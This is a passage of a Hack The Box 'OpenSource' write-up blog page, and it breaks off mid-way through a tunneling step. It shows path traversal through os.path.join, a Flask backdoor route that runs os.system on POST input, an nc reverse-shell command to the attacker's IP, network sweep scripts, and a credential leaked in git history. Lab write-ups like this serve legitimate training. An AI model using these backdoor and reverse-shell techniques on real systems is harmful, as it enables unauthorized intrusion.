@@ -1,0 +1,607 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>OpenSource Writeup - vymvn</title><meta name="Description" content="My personal website / blog"><meta property="og:title" content="OpenSource Writeup" />
+<meta property="og:description" content="Summary This machine&rsquo;s theme is that it is an opensource file transfer app, where one user can upload a file and they would get a URL they can share with others to download. Vulnrabilites in the code made it possible for an attacker to upload a backdoor and get command execution on a Docker container. Where the attacker could then pivot to a filtered Gitea service and log in to one of the users using found credentials in a previous commit in the git repository." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://vymvn.xyz/htb-opensource/" /><meta property="og:image" content="https://vymvn.xyz/assets/image/avatar.png"/><meta property="article:section" content="posts" />
+
+<meta property="og:site_name" content="vymvn" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://vymvn.xyz/assets/image/avatar.png"/>
+
+<meta name="twitter:title" content="OpenSource Writeup"/>
+<meta name="twitter:description" content="Summary This machine&rsquo;s theme is that it is an opensource file transfer app, where one user can upload a file and they would get a URL they can share with others to download. Vulnrabilites in the code made it possible for an attacker to upload a backdoor and get command execution on a Docker container. Where the attacker could then pivot to a filtered Gitea service and log in to one of the users using found credentials in a previous commit in the git repository."/>
+<meta name="application-name" content="vymvn">
+<meta name="apple-mobile-web-app-title" content="vymvn"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://vymvn.xyz/htb-opensource/" /><link rel="prev" href="https://vymvn.xyz/stack5/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "OpenSource Writeup",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/vymvn.xyz\/htb-opensource\/"
+        },"genre": "posts","keywords": "git, LFI, RCE, Docker, Port Forwarding, Tunneling, git hooks","wordcount":  1288 ,
+        "url": "https:\/\/vymvn.xyz\/htb-opensource\/","license": "lmao","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "vymvn"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="vymvn"><span class="header-title-pre"><span style='color:green'>[+]</span></span><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="vymvn"><span class="header-title-pre"><span style='color:green'>[+]</span></span><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">OpenSource Writeup</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>vymvn</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/htb/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>HTB</a>&nbsp;<a href="/categories/machines/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Machines</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="0001-01-01">0001-01-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1288 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;7 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#summary">Summary</a></li>
+    <li><a href="#enumration">Enumration</a>
+      <ul>
+        <li><a href="#port-scanning">Port scanning</a></li>
+        <li><a href="#website">Website</a></li>
+        <li><a href="#git-commits">Git commits</a></li>
+        <li><a href="#testing-for-local-file-inclusion-lfi">Testing for local file inclusion (LFI)</a></li>
+      </ul>
+    </li>
+    <li><a href="#foothold">Foothold</a>
+      <ul>
+        <li><a href="#testing-rce">Testing RCE</a></li>
+        <li><a href="#getting-a-reverse-shell">Getting a reverse shell</a></li>
+        <li><a href="#network-enumration">Network enumration</a></li>
+        <li><a href="#tunneling-in">Tunneling in</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ul>
+        <li><a href="#checking-procceses">Checking procceses</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/img/HTB-opensource/OpenSource.png"
+        data-srcset="/assets/img/HTB-opensource/OpenSource.png, /assets/img/HTB-opensource/OpenSource.png 1.5x, /assets/img/HTB-opensource/OpenSource.png 2x"
+        data-sizes="auto"
+        alt="/assets/img/HTB-opensource/OpenSource.png"
+        title="Opensource" /></p>
+<h1 id="summary">Summary</h1>
+<p>This machine&rsquo;s theme is that it is an opensource file transfer app, where one user can upload a file and they would get a URL they can share with others to download. Vulnrabilites in the code made it possible for an attacker to upload a backdoor and get command execution on a Docker container. Where the attacker could then pivot to a filtered Gitea service and log in to one of the users using found credentials in a previous commit in the git repository. Privilage escaltion revolves around a custom script ran as root to commit and push the home directory of the comprised user, that can be exploited by adding a malicious pre-commit hook.</p>
+<h1 id="enumration">Enumration</h1>
+<h2 id="port-scanning">Port scanning</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -sC -sV -o nmap/basic 10.10.11.164
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Port <code>80</code> and port <code>22</code> are open which are just <code>ssh</code> and <code>http</code>, but there is another port <code>3000</code> that is filtered by a firewall.</p>
+<blockquote>
+<p>Website running in development mode with python debugger Werkzeug/2.1.2</p>
+</blockquote>
+<p>That means we could access /console for code execution if we knew the pincode.. or generated it.</p>
+<p><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug#pin-protected" target="_blank" rel="noopener noreffer">Werkzeug Pin code generation</a>
+ is possible but we are gonna need access to files on the machine.</p>
+<h2 id="website">Website</h2>
+<p>Web page promoting their open source file sharing app.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/img/HTB-opensource/WebPage.png"
+        data-srcset="/assets/img/HTB-opensource/WebPage.png, /assets/img/HTB-opensource/WebPage.png 1.5x, /assets/img/HTB-opensource/WebPage.png 2x"
+        data-sizes="auto"
+        alt="/assets/img/HTB-opensource/WebPage.png"
+        title="Web page" />
+We have the option to download the source code and another option to go to the running app in <code>/upcloud</code>
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/img/HTB-opensource/Upcloud.png"
+        data-srcset="/assets/img/HTB-opensource/Upcloud.png, /assets/img/HTB-opensource/Upcloud.png 1.5x, /assets/img/HTB-opensource/Upcloud.png 2x"
+        data-sizes="auto"
+        alt="/assets/img/HTB-opensource/Upcloud.png"
+        title="upcloud app" /></p>
+<blockquote>
+<p>App has upload functionality. possible LFI?</p>
+</blockquote>
+<h2 id="git-commits">Git commits</h2>
+<p>Since this is a git repo we can check for any sensitive files or secrets that were commited previously. A good tool for this is <a href="https://www.gitkraken.com/" target="_blank" rel="noopener noreffer">gitkraken</a>
+.</p>
+<blockquote>
+<p>Found creds in a previous commit in the dev branch</p>
+</blockquote>
+<p><code>dev01:Soulless_Developer#2022</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;python.pythonPath&#34;</span><span class="p">:</span> <span class="s2">&#34;/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;http.proxy&#34;</span><span class="p">:</span> <span class="s2">&#34;http://dev01:Soulless_Developer#2022@10.10.10.128:5187/&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;http.proxyStrictSSL&#34;</span><span class="p">:</span> <span class="kc">false</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Found in .vscode/settings.json
+commit: a76f8f75f7a4a12b706b0cf9c983796fa1985820
+In the dev branch.</p>
+<h2 id="testing-for-local-file-inclusion-lfi">Testing for local file inclusion (LFI)</h2>
+<ul>
+<li>Uploading a file stores it in <code>/uploads/{FILE}</code></li>
+<li>Tried navigating to <code>/uploads/../../../../etc/passwd</code> but it gets filtered</li>
+</ul>
+<p>Since we have the source code we can see how it is being filtered.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_file_name</span><span class="p">(</span><span class="n">unsafe_filename</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">recursive_replace</span><span class="p">(</span><span class="n">unsafe_filename</span><span class="p">,</span> <span class="s2">&#34;../&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This function sanitizes the file name from the users post request (uploading a file).</p>
+<p>We can see that it only filters <code>../</code></p>
+<p>And if we check out how the path is constructed in <code>views.py</code>. We see that it just uses <code>os.path.join()</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/upcloud&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">upload_file</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">f</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">files</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">file_name</span> <span class="o">=</span> <span class="n">get_file_name</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">filename</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">file_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getcwd</span><span class="p">(),</span> <span class="s2">&#34;public&#34;</span><span class="p">,</span> <span class="s2">&#34;uploads&#34;</span><span class="p">,</span> <span class="n">file_name</span><span class="p">)</span> <span class="c1"># Vulnerable line</span>
+</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="n">file_path</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;success.html&#39;</span><span class="p">,</span> <span class="n">file_url</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">host_url</span> <span class="o">+</span> <span class="s2">&#34;uploads/&#34;</span> <span class="o">+</span> <span class="n">file_name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;upload.html&#39;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And that is vulnerable because, if we looked at how <code>os.path.join()</code> works
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/img/HTB-opensource/os_path_vuln.png"
+        data-srcset="/assets/img/HTB-opensource/os_path_vuln.png, /assets/img/HTB-opensource/os_path_vuln.png 1.5x, /assets/img/HTB-opensource/os_path_vuln.png 2x"
+        data-sizes="auto"
+        alt="/assets/img/HTB-opensource/os_path_vuln.png"
+        title="path vuln" /></p>
+<p>We can see that if we add a <code>/</code> to any argument it will ignore all the arguments that came before and start from the argument that starts with <code>/</code>.</p>
+<p>So that means we could control the file path and bypass the LFI filter by just adding a <code>/</code> making it an absolute path.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">curl http://opensource.htb/uploads/..%2f%2fetc/passwd
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/img/HTB-opensource/etc-passwd.png"
+        data-srcset="/assets/img/HTB-opensource/etc-passwd.png, /assets/img/HTB-opensource/etc-passwd.png 1.5x, /assets/img/HTB-opensource/etc-passwd.png 2x"
+        data-sizes="auto"
+        alt="/assets/img/HTB-opensource/etc-passwd.png"
+        title="passwd" /></p>
+<p>This does return <code>/etc/passwd</code> from the target machine.</p>
+<blockquote>
+<p>Using this LFI I have tried generating the werkzueg pin code but I could not get that to work.</p>
+</blockquote>
+<hr>
+<h1 id="foothold">Foothold</h1>
+<ul>
+<li>
+<p>Found some cronjob, but there are no executable scripts to modify.</p>
+</li>
+<li>
+<p>We have file read and file upload so what is stopping us from changing the source code on the server to add our own vulnerable code to get RCE</p>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="o">...</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/vymvn&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">shell</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cmd</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;text&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">processed_cmd</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">processed_cmd</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>added this function to <code>views.py</code> which will take any data we send with as <code>POST</code> request and process it as a command and send it back. Basically making ourselves a backdoor.</p>
+<p>Now we need to upload <code>views.py</code> but uploading it normally will place it in <code>/uploads</code> and that would be useless.</p>
+<p>We can intercept the upload request with <code>burpsuite</code> and use the same method we used to bypass LFI filter to navigate to <code>/app/app/views.py</code>
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/img/HTB-opensource/burp.png"
+        data-srcset="/assets/img/HTB-opensource/burp.png, /assets/img/HTB-opensource/burp.png 1.5x, /assets/img/HTB-opensource/burp.png 2x"
+        data-sizes="auto"
+        alt="/assets/img/HTB-opensource/burp.png"
+        title="Intercepting request" />
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/img/HTB-opensource/upload_success.png"
+        data-srcset="/assets/img/HTB-opensource/upload_success.png, /assets/img/HTB-opensource/upload_success.png 1.5x, /assets/img/HTB-opensource/upload_success.png 2x"
+        data-sizes="auto"
+        alt="/assets/img/HTB-opensource/upload_success.png"
+        title="success" /></p>
+<h2 id="testing-rce">Testing RCE</h2>
+<p>Sending a <code>POST</code> request to <code>/vymvn</code> using curl:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">curl -X POST http://opensource.htb/vymvn -d <span class="s2">&#34;text=id&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/img/HTB-opensource/RCE_test.png"
+        data-srcset="/assets/img/HTB-opensource/RCE_test.png, /assets/img/HTB-opensource/RCE_test.png 1.5x, /assets/img/HTB-opensource/RCE_test.png 2x"
+        data-sizes="auto"
+        alt="/assets/img/HTB-opensource/RCE_test.png"
+        title="RCE test" /></p>
+<ul>
+<li><strong>We have RCE!</strong></li>
+</ul>
+<p>as root?</p>
+<h2 id="getting-a-reverse-shell">Getting a reverse shell</h2>
+<p>Setting up listener:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nc -lvnp <span class="m">6666</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Sending reverse shell command:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -X POST --data <span class="s2">&#34;text=nc 10.10.14.27 6666 -e /bin/ash&#34;</span> opensource.htb/vymvn
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>We know the shell is <code>/bin/ash</code> from the <code>/etc/passwd</code> file we got previously.
+{: .prompt-tip }</p>
+</blockquote>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/img/HTB-opensource/revshell.png"
+        data-srcset="/assets/img/HTB-opensource/revshell.png, /assets/img/HTB-opensource/revshell.png 1.5x, /assets/img/HTB-opensource/revshell.png 2x"
+        data-sizes="auto"
+        alt="/assets/img/HTB-opensource/revshell.png"
+        title="reverse shell" />
+After exploring the machine we can quickly realize that we are in a <code>Docker</code> container.</p>
+<h2 id="network-enumration">Network enumration</h2>
+<ul>
+<li>
+<p>The docker instance runs on its own interface (probably <code>docker0</code>)</p>
+</li>
+<li>
+<p>The docker interface has the network ip <code>172.17.0</code></p>
+</li>
+<li>
+<p>Wrote a quick shell script to ping sweep the network and see who is up.</p>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> host in <span class="k">$(</span>seq <span class="m">0</span> 255<span class="k">)</span><span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">	    ping -c <span class="m">1</span> 172.17.0.<span class="nv">$host</span> <span class="p">|</span> grep <span class="s2">&#34;bytes from&#34;</span> <span class="p">|</span> cut -d <span class="s2">&#34; &#34;</span> -f <span class="m">4</span> <span class="p">&amp;</span>
+</span></span><span class="line"><span class="cl"><span class="k">done</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can see hosts from <code>.1</code> to <code>.9</code> are up.</p>
+<p>Wrote another script to scan the ports on these hosts.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="nv">NETWORK</span><span class="o">=</span><span class="nv">$1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> host in <span class="k">$(</span>seq <span class="m">1</span> 9<span class="k">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">do</span>
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> port in <span class="k">$(</span>seq <span class="m">1</span> 4000<span class="k">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">do</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">r</span><span class="o">=</span><span class="k">$(</span>nc -zv -w <span class="m">1</span> <span class="nv">$NETWORK</span>.<span class="nv">$host</span> <span class="nv">$port</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="o">[[</span> <span class="nv">$r</span> <span class="o">==</span> *<span class="s2">&#34;succeeded&#34;</span>* <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">				<span class="nb">echo</span> <span class="nv">$r</span>
+</span></span><span class="line"><span class="cl">		<span class="k">fi</span>
+</span></span><span class="line"><span class="cl">	<span class="k">done</span>
+</span></span><span class="line"><span class="cl"><span class="k">done</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The output:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">172.17.0.1 (172.17.0.1:22) open
+</span></span><span class="line"><span class="cl">172.17.0.1 (172.17.0.1:80) open
+</span></span><span class="line"><span class="cl">172.17.0.1 (172.17.0.1:3000) open
+</span></span><span class="line"><span class="cl">172.17.0.2 (172.17.0.2:80) open
+</span></span><span class="line"><span class="cl">172.17.0.3 (172.17.0.3:80) open
+</span></span><span class="line"><span class="cl">172.17.0.4 (172.17.0.4:80) open
+</span></span><span class="line"><span class="cl">172.17.0.5 (172.17.0.5:80) open
+</span></span><span class="line"><span class="cl">172.17.0.6 (172.17.0.6:80) open
+</span></span><span class="line"><span class="cl">172.17.0.7 (172.17.0.7:80) open
+</span></span><span class="line"><span class="cl">172.17.0.8 (172.17.0.8:80) open
+</span></span><span class="line"><span class="cl">172.17.0.9 (172.17.0.9:80) open
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Since <code>172.17.0.1</code> is the network gateway and the ports open on it match the ports in the nmap scan we can confirm that it is the host machine.</p>
+<p>Port 3000 is running an HTTP server and we can connect to it from the docker container because it is inside the network and not filtered by a firewall.</p>
+<p>Now we can port forward/tunnel port 3000 to our machine and access it with the browser.</p>
+<h2 id="tunneling-in">Tunneling in</h2>
+<p>Found tunneling tool <a href="https://github.com/jpillora/chisel" target="_blank" rel="noopener noreffer">chisel</a>
+ which allowed me to create a tunnel to <code>172.17.0.1:3000</code> with reverse port forwarding.</p>
+<p>This was done by:</p>
+<ul>
+<li>Starting a chisel server on attack machine:</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">chisel server --reverse --port <span class="m">9999</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>Connecting from victim machine</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
